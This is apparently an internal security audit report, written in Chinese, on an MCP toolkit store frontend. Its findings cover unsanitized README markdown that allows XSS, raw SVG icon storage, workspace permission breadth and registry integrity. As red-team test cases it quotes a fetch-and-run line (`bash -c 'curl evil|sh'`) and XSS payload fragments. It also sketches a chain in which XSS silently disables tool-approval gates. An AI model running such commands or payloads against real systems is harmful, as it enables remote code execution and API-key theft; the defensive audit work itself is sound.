# SEC-INVESTIGATION-001 — findings-toolkit（dev-toolkit 自查）

**区域**：边界③ MCP 供应链（安装 = 执行第三方代码）+ store 条目渲染 sink
**范围**：`src/COMPONENTs/toolkit/`、`src/SERVICEs/mcp_install.js`、`mcp_toolkit_store.js`、`custom_mcp_icon_store.js`、`toolkit_auto_approve_store.js`、`mcp_toolkit_registry*.json`
**说明**：只读调查，未改任何代码。severity 为初判，待守复核统一定级。

---

## 清单项逐条结果

### 清单项 1 — stdio 命令/args 卫生
```
[L] [verified] [boundary ③]
src/SERVICEs/mcp_install.js:128-160（normalizeCustomMcpRecipe / parseCustomMcpArgs） —— 命令组装在前端只做拆词，不做白名单，但 spawn 决策权在后端
```
exploit 场景：custom MCP 的 `command`/`args` 由用户手填，前端 `parseCustomMcpArgs` 仅做 shell 风格分词后整段塞进 `recipe.mcp.{command,args}`，经 `installMcpToolkit` payload 发往 Flask，由后端 spawn。前端这一侧没有 `-y`/`@latest`/二进制白名单校验。
mitigation：真正的 spawn 与命令执行发生在 **Flask 侧（清单7 范畴）**，前端只是采集 + 透传。前端这一层不持有"安装即 RCE"的控制点，故作为前端 finding 定 Low；但 curated 条目 `npx -y @x@latest` 命令字符串本身是供应链热点，vetting 归 **mcp-store-curator + 清单7**。前端可补强：custom 安装前提示"将以你的权限运行此命令"。红用例：custom MCP 粘贴 `bash -c 'curl evil|sh'` 应在某层留痕。
note：跨边界的执行落点不在前端——这是 curator/Flask 的主战场，前端在此只是数据入口。

### 清单项 2 — custom MCP 自定义条目（手填 config）
**2a — env secrets / args / url 校验**
```
[已查无 finding（前端侧）] [boundary ③]
src/SERVICEs/mcp_install.js:107-126（parseCustomMcpEnvSecrets）
```
env key 受 `/^[A-Z_][A-Z0-9_]*$/` 约束、去重、空值丢弃，处理得当。`url`/`command` 仅 trim，未校验 scheme/内网地址——但发起请求/spawn 在后端，前端非 SSRF/RCE 执行点。scheme 校验需求转 **清单7（SSRF）**。

**2b — custom MCP icon 接受 data:/远程 URL** ⭐
```
[已查无 finding] [verified] [boundary ③]
src/SERVICEs/custom_mcp_icon_store.js:12-23（isValidIcon / VALID_MIME）
src/COMPONENTs/toolkit/pages/custom_mcp_page.js:23-75（readIconFile）
```
icon 走 `<input type=file>` 本地 FileReader，**不接受远程 URL**；存储层 `VALID_MIME = {image/png, image/svg+xml}`、`MAX_CONTENT_LENGTH 400KB`、`MAX_ENTRIES 100`、key 必须 `mcp.custom.*`。raster 经 canvas 重编码为 PNG（剥掉原始字节）。SVG 原文存储的风险见 F-2。

### 清单项 3 — store 条目渲染与信任标识 ⭐ 头号热点
**F-1（最重要）— store 条目 README markdown 未清洗 HTML（供应链 XSS）**
```
[H] [verified] [boundary ③]
src/COMPONENTs/toolkit/components/store_toolkit_detail_panel.js:989 —— <Markdown content={entry.readmeMarkdown || ""} /> 未传 sanitize_html
src/COMPONENTs/toolkit/components/toolkit_detail_panel.js:668 —— 同样的 <Markdown content={detail.readmeMarkdown} />（已安装条目详情）
底层：src/BUILTIN_COMPONENTs/markdown/markdown.js:174 默认 sanitize_html=false → :385 sanitizeHtml={false} 进 ReactShowdown
```
exploit 场景：第三方 MCP 注册表（`source==="mcp_registry"` / `externalReview`，经 `importMcpStoreRegistry` 由用户添加的外部 registry URL 拉取）提供 `readmeMarkdown`。数据流：`api.unchain.listMcpStoreEntries()`（含外部 registry 条目）→ `toolkits_page.js:107 setMcpStoreEntriesCache` → 渲染 `StoreToolkitDetailPanel`。攻击者在自己 registry 条目 README 塞 `<img src=x onerror>` / `<iframe>` / `<script>`，用户点开详情即触发，在 renderer 执行任意 JS——可读 localStorage（含 provider API key，见清单5）、调 `window.*API` bridge。与清单3（chat-bubble）markdown 默认不清洗是同一底层缺陷在 toolkit 面的第二个落点。
mitigation：两处 `<Markdown>` 显式传 `sanitize_html={true}`（**我地盘可独立落地，无需动共享 primitive**）；或 CTO 层翻转 `markdown.js` 默认值（共享 primitive，归 pupu-cto 仲裁）。验证：构造带 `<img onerror>` 的 registry 条目，确认不执行。红用例：外部 registry README XSS。

**F-1b — 条目 name/description/badge 文本渲染**
```
[已查无 finding] [verified] [boundary ③]
store_toolkit_card.js:139,154；store_toolkit_detail_panel.js:379,389
```
name/desc/license/repoFullName 全部作 React text children，自动转义，非 HTML sink，安全。

**F-1c — 风险分级提示**
```
[L] [verified] [boundary ③]
store_toolkit_detail_panel.js:263-284 + constants.js TRUST_CONFIG
```
external/needs_review 条目有 warning badge + risk summary（:438 riskLevel、:667 approvalRiskRows、:929 🔒 工具标记），分级提示存在且较完善。但 curated installable 与潜在高危条目卡片层观感接近。UX 风险提示问题，定 Low，转 ux-designer 评估"安装即运行第三方代码"措辞强度。

### 清单项 4 — auto-approve 持久化
```
[已查无 finding] [verified] [boundary ③]
src/SERVICEs/toolkit_auto_approve_store.js 全文
```
`normalizeToolkitId` 限长 200 + 白名单别名；`sanitizeToolkitIds/ToolKeys` 去重 + `MAX_IDS 100`；写入只发生在用户显式 `setToolkitAutoApprove(id,true)`。**未发现"条目自声明撑大 auto-approve"路径**——完全由用户 UI 勾选驱动。本区最稳的一块。
暗角（suspected，转清单7）：auto-approve 是纯前端 localStorage 判定（`isToolAutoApproved`）。若服务端确认门控信任前端 approve 标志，则 renderer 被 XSS（F-1）后可写 `toolkit_auto_approve` 静默关门控。**把 F-1 与清单7 第6项串成链**：XSS → 写 auto-approve → 后续工具静默执行。

### 清单项 5 — filesystem server 权限广度
```
[M] [suspected] [boundary ③]
src/SERVICEs/mcp_install.js:57-65（resolveInstallWorkspace）+ 11-12（requiresWorkspace）
```
exploit 场景：`workspace.required` 条目安装时把整个 `readWorkspaceRoot()` 作 `workspaceRoot` 传后端 server，**无 scope 收窄、无逐目录授权、无"将获得整个工作区读写权"显式提示**。被投毒的 filesystem-类 server 安装后即获工作区全量读写。
mitigation：前端在安装 `requiresWorkspace` 条目时明确告知（"此工具将获得 ${workspaceRoot} 读写权限"）。路径边界 enforcement 在 Flask（清单7 第3项），前端只能知情提示。定 Medium（知情缺失），enforcement 归清单7。

### 清单项 6 — registry 完整性
```
[M] [verified] [boundary ③]
src/SERVICEs/mcp_toolkit_registry.json（bundled）+ mcp_toolkit_registry.schema.json
```
bundled registry 篡改需先攻陷分发渠道/本地文件（机器已攻陷 → 降 Low）。但 schema `additionalProperties:true` 贯穿全文，`command`/`url` 仅 `type:string`/`format:uri`，**不约束 command 在允许 runner 白名单**（npx/uvx/node）。更关键：**外部 registry**（`importMcpStoreRegistry`，用户填 URL）条目走同一渲染/安装路径，完整性在远端，**无签名校验**。
mitigation：schema 为 stdio `command` 加 runner 枚举（归 mcp-store-curator）；外部 registry 签名/完整性归清单7 + curator。前端 finding：`additionalProperties:true` 让未知（含潜在渲染）字段无声通过，定 Medium，**转 curator（schema 拥有者）**。

---

## 清单外暗角（我补充）

**F-2 — custom MCP SVG icon 原文存储，渲染若进 HTML sink 则 XSS**
```
[M] [suspected] [boundary ③]
src/SERVICEs/custom_mcp_icon_store.js:70-75（SVG content 原文存）
src/COMPONENTs/toolkit/pages/custom_mcp_page.js:33-43（SVG readAsText 原文）
```
exploit 场景：custom icon 允许 `image/svg+xml`，原始文本存 localStorage。SVG 可内嵌 `<script>`/`onload`。可利用性取决于 `toolkit_icon.js` 如何渲染 SVG——若内联（dangerouslySetInnerHTML 等）则 stored XSS；若走 `<img src=data:>` 则不执行。**渲染层 `toolkit_icon.js` 在我地盘但本轮未深读**，标 suspected。
mitigation：确认 `ToolkitIcon` SVG 渲染路径；若内联需 sanitize 或改 `<img>`。红用例：上传带 `<script>` 的 SVG 作 custom icon。

**F-3 — metadata icon file-icon content 未做 mime 白名单**
```
[L] [suspected] [boundary ③]
src/SERVICEs/mcp_toolkit_store.js:120,175-189（setMcpStoreMetadataCache / isFileIcon）
```
`isFileIcon` 只校验字段存在，不校验 mimeType 白名单（不像 custom_mcp_icon_store 有 VALID_MIME）。metadata 来自后端（含外部 registry 抓取的 icon）。与 F-2 同根，定 Low/suspected，渲染层确认后再定。

---

## 我学到的隐患

1. **"安装一个工具" = 在用户机器上跑陌生人的代码——但前端不是这道闸的执行点。** 前端（我地盘）是数据采集 + 渲染 + 知情提示层；spawn/路径/SSRF enforcement 在 Flask（清单7）。我的安全价值在：① 不把第三方内容当可信渲染（F-1），② 给用户充分知情提示（清单5 workspace、清单1 命令）。分清执行点与采集点，才不误判 severity。

2. **markdown 默认 `sanitize_html=false` 在 toolkit 面有第二个落点（F-1）。** chat-bubble 是头号嫌疑，但 store/installed 详情的 README 是同一缺陷的另一落地，且 README 来自外部 registry，attacker-influenceable 极高。我能独立修：两处 `<Markdown>` 显式传 `sanitize_html={true}`。

3. **auto-approve 是纯前端 localStorage 判定——它的安全等于 renderer 的安全。** auto-approve store 本身写得很稳（无自声明撑大路径），但 renderer 被 F-1 XSS 攻破后，攻击者可直接写 `toolkit_auto_approve` 静默关闭工具确认门控。**把"渲染层 XSS"与"安全控制被绕过"连成链**——F-1 真实杀伤比单纯 XSS 更大。服务端必须是确认门控真相源（清单7 第6项）。

4. **图标这种"看起来无害"的字段是隐蔽注入面。** custom icon（SVG 原文）、metadata icon（无 mime 白名单）都可能携带可执行内容，威胁取决于 `toolkit_icon.js` 渲染方式。"它只是个图标"是危险的轻视——SVG 是可执行文档格式。

---

## findings 数量统计（按初判 severity）

| Severity | 数量 | 条目 |
|----------|------|------|
| **High** | 1 | F-1（store/installed README markdown 未清洗 HTML，供应链 XSS）|
| **Medium** | 3 | F-2（custom SVG icon 原文存储）、清单5（filesystem workspace 全量授权无提示）、清单6（registry schema additionalProperties + 外部 registry 无签名）|
| **Low** | 3 | 清单1（custom 命令前端无白名单，执行点在后端）、F-1c（风险提示观感）、F-3（metadata icon 无 mime 白名单）|
| 已查无 finding | 4 | 2a env 校验、2b custom icon 远程 URL、F-1b 文本转义、清单4 auto-approve store |

**最重要 1-2 条：**
- **F-1（High）**：`store_toolkit_detail_panel.js:989` 与 `toolkit_detail_panel.js:668` 用默认 `sanitize_html=false` 渲染条目 README markdown。外部 MCP registry 条目 README 是 attacker-controlled，可注入 `<img onerror>`/`<script>` 在 renderer 执行任意 JS → 读 localStorage（provider API key）、调 bridge。修法在我地盘可独立落地（两处显式传 `sanitize_html={true}`）。
- **链式风险**：F-1（XSS）→ 写 `toolkit_auto_approve` localStorage → 静默关闭工具确认门控（清单7 第6项需服务端为真相源兜底）。单看是 XSS，连起来是"绕过边界③核心安全控制"。
